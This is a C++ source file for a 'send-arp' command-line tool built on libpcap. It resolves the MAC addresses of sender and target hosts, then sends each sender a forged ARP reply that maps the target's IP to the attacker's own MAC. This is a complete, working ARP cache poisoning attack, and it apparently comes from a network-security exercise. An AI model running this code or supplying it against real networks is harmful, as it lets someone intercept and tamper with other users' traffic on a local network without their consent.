#include <cstdio>
#include <cstring>
#include <pcap.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "getHostInfo.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// int getHostInfo(const char* interfaceName, Ip* myIp, Mac* myMac) {
// 	int sock = socket(AF_INET, SOCK_DGRAM, 0);
// 	if (sock < 0) {
// 		perror("socket()");
// 		return -1;
// 	}

// 	struct ifreq ifr;
// 	memset(&ifr, 0, sizeof(ifr));
// 	strncpy(ifr.ifr_name, interfaceName, IFNAMSIZ - 1);

// 	if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
// 		perror("ioctl(SIOCGIFHWADDR)");
// 		close(sock);
// 		return -1;
// 	}
// 	*myMac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);

// 	if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
// 		perror("ioctl(SIOCGIFADDR)");
// 		close(sock);
// 		return -1;
// 	}
// 	struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
// 	*myIp = Ip(addr->sin_addr.s_addr);

// 	close(sock);
// 	return 0;
// }

void fillArpPacket(EthArpPacket& pkt, uint16_t op, Mac eth_dmac, Mac eth_smac,
		Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip) {
	pkt.eth_.dmac_ = eth_dmac;
	pkt.eth_.smac_ = eth_smac;
	pkt.eth_.type_ = htons(EthHdr::Arp);

	pkt.arp_.hrd_ = htons(ArpHdr::ETHER);
	pkt.arp_.pro_ = htons(EthHdr::Ip4);
	pkt.arp_.hln_ = Mac::Size;
	pkt.arp_.pln_ = Ip::Size;
	pkt.arp_.op_ = htons(op);
	pkt.arp_.smac_ = arp_smac;
	pkt.arp_.sip_ = htonl(arp_sip);
	pkt.arp_.tmac_ = arp_tmac;
	pkt.arp_.tip_ = htonl(arp_tip);
}

void sendArp(pcap_t* pcap, const EthArpPacket& pkt) {
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}
}

Mac getMac(pcap_t* pcap, Ip attackerIp, Mac attackerMac, Ip ip) {
	EthArpPacket pkt;
	fillArpPacket(pkt, ArpHdr::Request, Mac::broadcastMac(), attackerMac,
			attackerMac, attackerIp, Mac::nullMac(), ip);
	sendArp(pcap, pkt);

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res != 1) {
			continue;
		}

		EthArpPacket* reply = (EthArpPacket*)packet;
		if (ntohs(reply->eth_.type_) == EthHdr::Arp &&
			ntohs(reply->arp_.op_) == ArpHdr::Reply &&
			reply->arp_.sip_ == Ip(htonl(ip)) &&
			reply->arp_.tip_ == Ip(htonl(attackerIp))) {
			return reply->arp_.smac_;
		}
	}
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc % 2) != 0) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	Ip attackerIp;
	Mac attackerMac;
	if (getHostInfo(dev, &attackerIp, &attackerMac) < 0) {
		fprintf(stderr, "couldn't get host info from %s\n", dev);
		pcap_close(pcap);
		return EXIT_FAILURE;
	}
	printf("[+] my ip   : %s\n", std::string(attackerIp).c_str());
	printf("[+] my mac  : %s\n", std::string(attackerMac).c_str());

	for (int i = 2; i < argc; i += 2) {
		Ip senderIp = Ip(argv[i]);
		Ip targetIp = Ip(argv[i + 1]);

		Mac senderMac = getMac(pcap, attackerIp, attackerMac, senderIp);
		Mac targetMac = getMac(pcap, attackerIp, attackerMac, targetIp);
		printf("[+] sender %s is at %s\n", std::string(senderIp).c_str(), std::string(senderMac).c_str());
		printf("[+] target %s is at %s\n", std::string(targetIp).c_str(), std::string(targetMac).c_str());

		EthArpPacket poison;
		fillArpPacket(poison, ArpHdr::Reply, senderMac, attackerMac,
				attackerMac, targetIp, senderMac, senderIp);
		sendArp(pcap, poison);
	}

	pcap_close(pcap);
	// return EXIT_SUCCESS;
}
